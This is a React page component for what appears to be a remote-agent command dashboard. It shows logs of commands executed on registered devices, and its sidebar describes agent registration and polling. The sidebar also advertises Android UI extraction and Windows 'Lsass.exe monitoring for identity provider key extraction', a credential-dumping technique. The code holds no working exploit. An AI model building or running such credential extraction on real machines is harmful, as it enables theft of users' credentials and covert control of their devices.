import { useCommands } from "@/hooks/use-commands";
import { useDevices } from "@/hooks/use-devices";
import { Terminal, Clock, Server, CheckCircle2, XCircle, RotateCw, Shield, Cpu, Info } from "lucide-react";
import { StatusBadge } from "@/components/StatusBadge";
import { format } from "date-fns";
import { useState } from "react";
import { cn } from "@/lib/utils";
import { Card, CardHeader, CardContent } from "@/components/ui/card";

export default function Commands() {
  const [filterDevice, setFilterDevice] = useState<number | undefined>(undefined);
  const { data: commands, isLoading } = useCommands(filterDevice);
  const { data: devices } = useDevices();

  return (
    <div className="space-y-6 animate-in fade-in duration-500">
      <div className="flex justify-between items-end border-b border-border pb-4">
        <div>
          <h1 className="text-2xl font-display font-bold text-foreground">
            OPERATION LOGS <span className="text-primary">// HISTORY</span>
          </h1>
          <p className="text-muted-foreground text-sm font-mono mt-1">
            AUDIT TRAIL OF EXECUTED COMMANDS AND SCRIPTS
          </p>
        </div>
        
        <div className="flex items-center gap-2">
          <select 
            className="bg-background border border-border text-sm p-2 rounded-sm font-mono focus:border-primary focus:outline-none"
            onChange={(e) => setFilterDevice(e.target.value ? parseInt(e.target.value) : undefined)}
            value={filterDevice || ""}
          >
            <option value="">ALL ASSETS</option>
            {devices?.map(d => (
              <option key={d.id} value={d.id}>{d.name} ({d.ipAddress})</option>
            ))}
          </select>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        <div className="lg:col-span-3 border border-border bg-black/40 rounded-sm overflow-hidden h-fit">
          {isLoading ? (
            <div className="p-8 text-center font-mono text-primary animate-pulse">FETCHING LOGS...</div>
          ) : commands?.length === 0 ? (
            <div className="p-8 text-center font-mono text-muted-foreground">NO OPERATIONS RECORDED</div>
          ) : (
            <div className="divide-y divide-border/50">
              {commands?.map((cmd) => (
                <CommandRow key={cmd.id} command={cmd} deviceName={devices?.find(d => d.id === cmd.deviceId)?.name || "Unknown"} />
              ))}
            </div>
          )}
        </div>

        <div className="space-y-6">
          <Card className="bg-card/50 border-border">
            <CardHeader className="py-4 border-b border-border">
              <h3 className="text-sm font-display font-bold flex items-center gap-2">
                <Shield className="w-4 h-4 text-primary" />
                AGENT SPECIFICATIONS
              </h3>
            </CardHeader>
            <CardContent className="p-4 space-y-4">
              <div className="space-y-2">
                <h4 className="text-[10px] font-bold text-primary uppercase tracking-tighter">Lifecycle: Handshake</h4>
                <p className="text-[11px] text-muted-foreground leading-relaxed">
                  Agents register via <span className="text-foreground">/api/agents/register</span> with hardware UUID, hostname, and OS profile.
                </p>
              </div>
              <div className="space-y-2">
                <h4 className="text-[10px] font-bold text-primary uppercase tracking-tighter">Lifecycle: Polling</h4>
                <p className="text-[11px] text-muted-foreground leading-relaxed">
                  5-second interval heartbeat maintained. Agents fetch pending tasks from <span className="text-foreground">/api/agents/:id/commands</span>.
                </p>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-card/50 border-border">
            <CardHeader className="py-4 border-b border-border">
              <h3 className="text-sm font-display font-bold flex items-center gap-2">
                <Cpu className="w-4 h-4 text-accent" />
                OS AUTOMATIONS
              </h3>
            </CardHeader>
            <CardContent className="p-4 space-y-4">
              <div className="p-2 bg-black/20 border border-border rounded-sm">
                <span className="text-[9px] font-bold text-accent uppercase">Android (Termux/ADB)</span>
                <p className="text-[10px] text-muted-foreground mt-1">View hierarchy extraction via uiautomator for UI mapping.</p>
              </div>
              <div className="p-2 bg-black/20 border border-border rounded-sm">
                <span className="text-[9px] font-bold text-accent uppercase">Windows (PS/CMD)</span>
                <p className="text-[10px] text-muted-foreground mt-1">Lsass.exe monitoring for identity provider key extraction.</p>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}

function CommandRow({ command, deviceName }: { command: any, deviceName: string }) {
  const [expanded, setExpanded] = useState(false);

  return (
    <div className="group hover:bg-white/5 transition-colors">
      <div 
        className="p-4 flex flex-col md:flex-row md:items-center justify-between gap-4 cursor-pointer"
        onClick={() => setExpanded(!expanded)}
      >
        <div className="flex items-center gap-4">
          <div className={cn(
            "p-2 rounded-sm border",
            command.status === "completed" ? "bg-green-500/10 border-green-500/30 text-green-500" :
            command.status === "failed" ? "bg-red-500/10 border-red-500/30 text-red-500" :
            "bg-blue-500/10 border-blue-500/30 text-blue-500"
          )}>
            {command.status === "completed" ? <CheckCircle2 className="w-5 h-5" /> :
             command.status === "failed" ? <XCircle className="w-5 h-5" /> :
             <RotateCw className="w-5 h-5 animate-spin" />}
          </div>
          <div>
            <div className="flex items-center gap-2 mb-1">
              <span className="font-mono text-xs text-primary">DEV-{command.deviceId}</span>
              <span className="text-xs text-muted-foreground uppercase">// {deviceName}</span>
            </div>
            <div className="font-mono font-bold text-sm text-foreground">{command.command}</div>
          </div>
        </div>

        <div className="flex items-center gap-6 text-xs font-mono text-muted-foreground">
          <div className="flex items-center gap-2">
            <Clock className="w-3 h-3" />
            {command.executedAt ? format(new Date(command.executedAt), "MMM dd HH:mm:ss") : "Queued"}
          </div>
          <StatusBadge status={command.status} />
        </div>
      </div>

      {expanded && command.output && (
        <div className="px-4 pb-4 pl-16">
          <div className="bg-black/80 border border-border p-3 rounded-sm font-mono text-xs text-gray-300 whitespace-pre-wrap max-h-64 overflow-y-auto shadow-inner">
            <div className="flex items-center gap-2 text-muted-foreground border-b border-white/10 pb-2 mb-2">
              <Terminal className="w-3 h-3" />
              <span>STDOUT / STDERR</span>
            </div>
            {command.output}
          </div>
        </div>
      )}
    </div>
  );
}
